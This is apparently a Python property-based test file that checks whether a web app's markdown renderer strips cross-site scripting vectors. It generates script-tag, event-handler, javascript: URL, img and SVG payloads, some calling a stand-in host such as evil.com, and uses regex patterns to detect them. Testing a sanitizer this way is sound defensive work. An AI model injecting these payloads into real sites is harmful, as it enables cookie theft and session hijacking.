"""Property-based tests for markdown XSS sanitization.

# Feature: bentwookie-web-ui-enhancements, Property 3: Markdown XSS Sanitization
# **Validates: Requirements 2.3**

Property Definition:
*For any* markdown input containing potentially malicious content (script tags, event handlers,
javascript: URLs), the Markdown_Renderer output SHALL NOT contain any executable JavaScript
code or event handlers.
"""

import re

from hypothesis import given, settings, strategies as st

from bentwookie.web.app import render_markdown


# ============================================================================
# XSS Attack Vector Strategies
# ============================================================================

# Strategy for generating random JavaScript code snippets
js_code_strategy = st.sampled_from([
    "alert('xss')",
    "alert(1)",
    "alert(document.cookie)",
    "console.log('xss')",
    "eval('malicious')",
    "document.location='http://evil.com'",
    "window.location='http://evil.com'",
    "fetch('http://evil.com')",
])

# Strategy for generating random event handler names
event_handler_strategy = st.sampled_from([
    "onclick",
    "onerror",
    "onload",
    "onmouseover",
    "onmouseout",
    "onfocus",
    "onblur",
    "onsubmit",
    "onkeydown",
    "onkeyup",
    "onkeypress",
    "ondblclick",
    "onchange",
    "oninput",
    "onscroll",
    "onresize",
    "onunload",
    "onbeforeunload",
    "onanimationend",
    "ontransitionend",
])

# Strategy for generating random HTML tag names that could carry XSS
xss_tag_strategy = st.sampled_from([
    "script",
    "img",
    "a",
    "div",
    "span",
    "iframe",
    "object",
    "embed",
    "svg",
    "body",
    "input",
    "button",
    "form",
    "video",
    "audio",
    "source",
    "link",
    "style",
    "meta",
])

# Strategy for plain text content
plain_text_strategy = st.text(
    alphabet=st.characters(
        whitelist_categories=("L", "N", "Z"),
        blacklist_characters="<>\"'`\\",
    ),
    min_size=1,
    max_size=30,
).filter(lambda x: x.strip())


# ============================================================================
# XSS Attack Vector Generators
# ============================================================================

@st.composite
def script_tag_xss_strategy(draw):
    """Generate script tag XSS attack vectors."""
    js_code = draw(js_code_strategy)
    variant = draw(st.integers(min_value=0, max_value=5))
    
    if variant == 0:
        # Basic script tag
        return f"<script>{js_code}</script>"
    elif variant == 1:
        # Script tag with type attribute
        return f'<script type="text/javascript">{js_code}</script>'
    elif variant == 2:
        # Script tag with src attribute
        return '<script src="http://evil.com/xss.js"></script>'
    elif variant == 3:
        # Script tag with newlines
        return f"<script>\n{js_code}\n</script>"
    elif variant == 4:
        # Script tag with mixed case
        return f"<ScRiPt>{js_code}</ScRiPt>"
    else:
        # Script tag with spaces
        return f"< script >{js_code}</ script >"


@st.composite
def event_handler_xss_strategy(draw):
    """Generate event handler XSS attack vectors."""
    tag = draw(xss_tag_strategy)
    handler = draw(event_handler_strategy)
    js_code = draw(js_code_strategy)
    variant = draw(st.integers(min_value=0, max_value=3))
    
    if variant == 0:
        # Basic event handler
        return f'<{tag} {handler}="{js_code}">content</{tag}>'
    elif variant == 1:
        # Event handler with single quotes
        return f"<{tag} {handler}='{js_code}'>content</{tag}>"
    elif variant == 2:
        # Event handler without quotes
        return f"<{tag} {handler}={js_code}>content</{tag}>"
    else:
        # Event handler with mixed case
        handler_mixed = "".join(
            c.upper() if i % 2 else c.lower() 
            for i, c in enumerate(handler)
        )
        return f'<{tag} {handler_mixed}="{js_code}">content</{tag}>'


@st.composite
def javascript_url_xss_strategy(draw):
    """Generate javascript: URL XSS attack vectors."""
    js_code = draw(js_code_strategy)
    variant = draw(st.integers(min_value=0, max_value=4))
    
    if variant == 0:
        # Basic javascript: URL in anchor
        return f'<a href="javascript:{js_code}">click me</a>'
    elif variant == 1:
        # javascript: URL with mixed case
        return f'<a href="JaVaScRiPt:{js_code}">click me</a>'
    elif variant == 2:
        # javascript: URL in iframe
        return f'<iframe src="javascript:{js_code}"></iframe>'
    elif variant == 3:
        # javascript: URL with encoding
        return f'<a href="javascript&#58;{js_code}">click me</a>'
    else:
        # javascript: URL with whitespace
        return f'<a href="  javascript:{js_code}">click me</a>'


@st.composite
def img_xss_strategy(draw):
    """Generate img tag XSS attack vectors."""
    js_code = draw(js_code_strategy)
    variant = draw(st.integers(min_value=0, max_value=3))
    
    if variant == 0:
        # img with onerror
        return f'<img src="x" onerror="{js_code}">'
    elif variant == 1:
        # img with onload
        return f'<img src="valid.jpg" onload="{js_code}">'
    elif variant == 2:
        # img with invalid src and onerror
        return f'<img src="invalid://x" onerror="{js_code}">'
    else:
        # img with data URI and onerror
        return f'<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="{js_code}">'


@st.composite
def svg_xss_strategy(draw):
    """Generate SVG XSS attack vectors."""
    js_code = draw(js_code_strategy)
    variant = draw(st.integers(min_value=0, max_value=2))
    
    if variant == 0:
        # SVG with onload
        return f'<svg onload="{js_code}"></svg>'
    elif variant == 1:
        # SVG with embedded script
        return f'<svg><script>{js_code}</script></svg>'
    else:
        # SVG with animate
        return f'<svg><animate onbegin="{js_code}"></animate></svg>'


@st.composite
def mixed_xss_strategy(draw):
    """Generate mixed XSS attack vectors embedded in markdown."""
    xss_type = draw(st.integers(min_value=0, max_value=4))
    
    if xss_type == 0:
        xss = draw(script_tag_xss_strategy())
    elif xss_type == 1:
        xss = draw(event_handler_xss_strategy())
    elif xss_type == 2:
        xss = draw(javascript_url_xss_strategy())
    elif xss_type == 3:
        xss = draw(img_xss_strategy())
    else:
        xss = draw(svg_xss_strategy())
    
    # Optionally wrap in markdown context
    context = draw(st.integers(min_value=0, max_value=4))
    
    if context == 0:
        # Plain XSS
        return xss
    elif context == 1:
        # XSS in paragraph
        return f"Some text before {xss} and after"
    elif context == 2:
        # XSS in list item
        return f"- Item with {xss}"
    elif context == 3:
        # XSS in heading
        return f"# Heading with {xss}"
    else:
        # XSS in code block (should be escaped)
        return f"```\n{xss}\n```"


# ============================================================================
# XSS Detection Helpers
# ============================================================================

# Regex patterns for detecting XSS vectors in output
# These patterns look for actual HTML tags, not HTML-escaped content
SCRIPT_TAG_PATTERN = re.compile(r'<\s*script[^>]*>', re.IGNORECASE)
SCRIPT_CLOSE_PATTERN = re.compile(r'<\s*/\s*script\s*>', re.IGNORECASE)
# Event handlers must be inside actual HTML tags (preceded by < and tag name)
# This pattern matches: <tagname ... onclick="..." or <tagname onclick="..."
EVENT_HANDLER_IN_TAG_PATTERN = re.compile(
    r'<\s*\w+[^>]*\s+on\w+\s*=', re.IGNORECASE
)
# Match javascript: URLs in href/src attributes (actual executable context)
# Must be in actual attribute context, not HTML-escaped
JAVASCRIPT_URL_IN_ATTR_PATTERN = re.compile(
    r'(?:href|src)\s*=\s*["\']?\s*javascript\s*:', re.IGNORECASE
)
SVG_SCRIPT_PATTERN = re.compile(r'<\s*svg[^>]*>.*<\s*script', re.IGNORECASE | re.DOTALL)


def contains_executable_js(html: str) -> tuple[bool, str]:
    """Check if HTML contains executable JavaScript.
    
    This function checks for actual executable XSS vectors, not HTML-escaped
    content that appears inside code blocks (which is safe).
    
    The key insight is that content inside <pre><code> blocks is safe because:
    1. The HTML tags are escaped (< becomes &lt;)
    2. Event handlers only execute when they're attributes of actual HTML elements
    3. javascript: URLs only execute when they're in actual href/src attributes
    
    Returns:
        Tuple of (contains_xss, reason)
    """
    # Check for script tags (actual tags, not escaped)
    if SCRIPT_TAG_PATTERN.search(html):
        return True, "Contains <script> tag"
    if SCRIPT_CLOSE_PATTERN.search(html):
        return True, "Contains </script> tag"
    
    # Check for event handlers inside actual HTML tags
    # This won't match escaped content like &lt;img onerror=...
    if EVENT_HANDLER_IN_TAG_PATTERN.search(html):
        return True, "Contains event handler attribute in HTML tag"
    
    # Check for javascript: URLs in actual href/src attributes
    # This won't match HTML-escaped content like &quot;javascript:
    if JAVASCRIPT_URL_IN_ATTR_PATTERN.search(html):
        return True, "Contains javascript: URL in attribute"
    
    # Check for SVG with script
    if SVG_SCRIPT_PATTERN.search(html):
        return True, "Contains SVG with script"
    
    return False, ""


# ============================================================================
# Property Tests
# ============================================================================

class TestMarkdownXSSSanitizationProperty:
    """Property-based tests for render_markdown() XSS sanitization.
    
    # Feature: bentwookie-web-ui-enhancements, Property 3: Markdown XSS Sanitization
    # **Validates: Requirements 2.3**
    """

    @settings(max_examples=25)
    @given(xss_input=script_tag_xss_strategy())
    def test_script_tags_are_sanitized(self, xss_input: str):
        """Property: Script tags are removed from markdown output.
        
        # Feature: bentwookie-web-ui-enhancements, Property 3: Markdown XSS Sanitization
        # **Validates: Requirements 2.3**
        
        For any markdown input containing script tags, the Markdown_Renderer
        output SHALL NOT contain any <script> tags.
        """
        result = render_markdown(xss_input)
        
        has_xss, reason = contains_executable_js(result)
        assert not has_xss, (
            f"XSS detected in output: {reason}\n"
            f"Input: {xss_input!r}\n"
            f"Output: {result!r}"
        )

    @settings(max_examples=25)
    @given(xss_input=event_handler_xss_strategy())
    def test_event_handlers_are_sanitized(self, xss_input: str):
        """Property: Event handlers are removed from markdown output.
        
        # Feature: bentwookie-web-ui-enhancements, Property 3: Markdown XSS Sanitization
        # **Validates: Requirements 2.3**
        
        For any markdown input containing event handlers (onclick, onerror, etc.),
        the Markdown_Renderer output SHALL NOT contain any event handler attributes.
        """
        result = render_markdown(xss_input)
        
        has_xss, reason = contains_executable_js(result)
        assert not has_xss, (
            f"XSS detected in output: {reason}\n"
            f"Input: {xss_input!r}\n"
            f"Output: {result!r}"
        )

    @settings(max_examples=25)
    @given(xss_input=javascript_url_xss_strategy())
    def test_javascript_urls_are_sanitized(self, xss_input: str):
        """Property: javascript: URLs are removed from markdown output.
        
        # Feature: bentwookie-web-ui-enhancements, Property 3: Markdown XSS Sanitization
        # **Validates: Requirements 2.3**
        
        For any markdown input containing javascript: URLs, the Markdown_Renderer
        output SHALL NOT contain any javascript: protocol URLs.
        """
        result = render_markdown(xss_input)
        
        has_xss, reason = contains_executable_js(result)
        assert not has_xss, (
            f"XSS detected in output: {reason}\n"
            f"Input: {xss_input!r}\n"
            f"Output: {result!r}"
        )

    @settings(max_examples=25)
    @given(xss_input=img_xss_strategy())
    def test_img_xss_vectors_are_sanitized(self, xss_input: str):
        """Property: img tag XSS vectors are removed from markdown output.
        
        # Feature: bentwookie-web-ui-enhancements, Property 3: Markdown XSS Sanitization
        # **Validates: Requirements 2.3**
        
        For any markdown input containing img tags with event handlers,
        the Markdown_Renderer output SHALL NOT contain any executable JavaScript.
        """
        result = render_markdown(xss_input)
        
        has_xss, reason = contains_executable_js(result)
        assert not has_xss, (
            f"XSS detected in output: {reason}\n"
            f"Input: {xss_input!r}\n"
            f"Output: {result!r}"
        )

    @settings(max_examples=25)
    @given(xss_input=svg_xss_strategy())
    def test_svg_xss_vectors_are_sanitized(self, xss_input: str):
        """Property: SVG XSS vectors are removed from markdown output.
        
        # Feature: bentwookie-web-ui-enhancements, Property 3: Markdown XSS Sanitization
        # **Validates: Requirements 2.3**
        
        For any markdown input containing SVG elements with scripts or event handlers,
        the Markdown_Renderer output SHALL NOT contain any executable JavaScript.
        """
        result = render_markdown(xss_input)
        
        has_xss, reason = contains_executable_js(result)
        assert not has_xss, (
            f"XSS detected in output: {reason}\n"
            f"Input: {xss_input!r}\n"
            f"Output: {result!r}"
        )

    @settings(max_examples=25)
    @given(xss_input=mixed_xss_strategy())
    def test_mixed_xss_vectors_are_sanitized(self, xss_input: str):
        """Property: Mixed XSS vectors in markdown context are sanitized.
        
        # Feature: bentwookie-web-ui-enhancements, Property 3: Markdown XSS Sanitization
        # **Validates: Requirements 2.3**
        
        For any markdown input containing XSS vectors embedded in various
        markdown contexts (paragraphs, lists, headings), the Markdown_Renderer
        output SHALL NOT contain any executable JavaScript.
        """
        result = render_markdown(xss_input)
        
        has_xss, reason = contains_executable_js(result)
        assert not has_xss, (
            f"XSS detected in output: {reason}\n"
            f"Input: {xss_input!r}\n"
            f"Output: {result!r}"
        )

    @settings(max_examples=25)
    @given(
        safe_text=plain_text_strategy,
        xss_input=mixed_xss_strategy(),
    )
    def test_safe_content_preserved_while_xss_removed(
        self,
        safe_text: str,
        xss_input: str,
    ):
        """Property: Safe content is preserved while XSS is removed.
        
        # Feature: bentwookie-web-ui-enhancements, Property 3: Markdown XSS Sanitization
        # **Validates: Requirements 2.3**
        
        For any markdown input containing both safe text and XSS vectors,
        the Markdown_Renderer SHALL preserve the safe text while removing
        the malicious content.
        """
        # Combine safe text with XSS
        combined = f"{safe_text}\n\n{xss_input}\n\n{safe_text}"
        
        result = render_markdown(combined)
        
        # Verify XSS is removed
        has_xss, reason = contains_executable_js(result)
        assert not has_xss, (
            f"XSS detected in output: {reason}\n"
            f"Input: {combined!r}\n"
            f"Output: {result!r}"
        )
        
        # Verify safe text is preserved (at least partially)
        # Note: Some characters may be HTML-encoded
        assert safe_text in result or safe_text.strip() in result, (
            f"Safe text not preserved in output\n"
            f"Safe text: {safe_text!r}\n"
            f"Input: {combined!r}\n"
            f"Output: {result!r}"
        )


class TestSpecificXSSVectors:
    """Test specific known XSS attack vectors from the task description.
    
    # Feature: bentwookie-web-ui-enhancements, Property 3: Markdown XSS Sanitization
    # **Validates: Requirements 2.3**
    """

    def test_script_alert_xss(self):
        """Test: <script>alert('xss')</script> is sanitized.
        
        # Feature: bentwookie-web-ui-enhancements, Property 3: Markdown XSS Sanitization
        # **Validates: Requirements 2.3**
        """
        xss_input = "<script>alert('xss')</script>"
        result = render_markdown(xss_input)
        
        has_xss, reason = contains_executable_js(result)
        assert not has_xss, f"XSS detected: {reason}\nOutput: {result!r}"

    def test_img_onerror_xss(self):
        """Test: <img src="x" onerror="alert('xss')"> is sanitized.
        
        # Feature: bentwookie-web-ui-enhancements, Property 3: Markdown XSS Sanitization
        # **Validates: Requirements 2.3**
        """
        xss_input = '<img src="x" onerror="alert(\'xss\')">'
        result = render_markdown(xss_input)
        
        has_xss, reason = contains_executable_js(result)
        assert not has_xss, f"XSS detected: {reason}\nOutput: {result!r}"

    def test_anchor_javascript_url_xss(self):
        """Test: <a href="javascript:alert('xss')">click</a> is sanitized.
        
        # Feature: bentwookie-web-ui-enhancements, Property 3: Markdown XSS Sanitization
        # **Validates: Requirements 2.3**
        """
        xss_input = '<a href="javascript:alert(\'xss\')">click</a>'
        result = render_markdown(xss_input)
        
        has_xss, reason = contains_executable_js(result)
        assert not has_xss, f"XSS detected: {reason}\nOutput: {result!r}"

    def test_div_onmouseover_xss(self):
        """Test: <div onmouseover="alert('xss')">hover</div> is sanitized.
        
        # Feature: bentwookie-web-ui-enhancements, Property 3: Markdown XSS Sanitization
        # **Validates: Requirements 2.3**
        """
        xss_input = '<div onmouseover="alert(\'xss\')">hover</div>'
        result = render_markdown(xss_input)
        
        has_xss, reason = contains_executable_js(result)
        assert not has_xss, f"XSS detected: {reason}\nOutput: {result!r}"

    def test_iframe_javascript_src_xss(self):
        """Test: <iframe src="javascript:alert('xss')"></iframe> is sanitized.
        
        # Feature: bentwookie-web-ui-enhancements, Property 3: Markdown XSS Sanitization
        # **Validates: Requirements 2.3**
        """
        xss_input = '<iframe src="javascript:alert(\'xss\')"></iframe>'
        result = render_markdown(xss_input)
        
        has_xss, reason = contains_executable_js(result)
        assert not has_xss, f"XSS detected: {reason}\nOutput: {result!r}"

    def test_markdown_link_with_javascript_url(self):
        """Test: Markdown link [click](javascript:alert('xss')) is sanitized.
        
        # Feature: bentwookie-web-ui-enhancements, Property 3: Markdown XSS Sanitization
        # **Validates: Requirements 2.3**
        """
        xss_input = "[click](javascript:alert('xss'))"
        result = render_markdown(xss_input)
        
        has_xss, reason = contains_executable_js(result)
        assert not has_xss, f"XSS detected: {reason}\nOutput: {result!r}"

    def test_nested_xss_in_markdown(self):
        """Test: XSS nested in valid markdown is sanitized.
        
        # Feature: bentwookie-web-ui-enhancements, Property 3: Markdown XSS Sanitization
        # **Validates: Requirements 2.3**
        """
        xss_input = """# Heading

Some text with <script>alert('xss')</script> embedded.

- List item with <img src="x" onerror="alert('xss')">
- Another item

```
Code block with <script>alert('xss')</script>
```
"""
        result = render_markdown(xss_input)
        
        has_xss, reason = contains_executable_js(result)
        assert not has_xss, f"XSS detected: {reason}\nOutput: {result!r}"
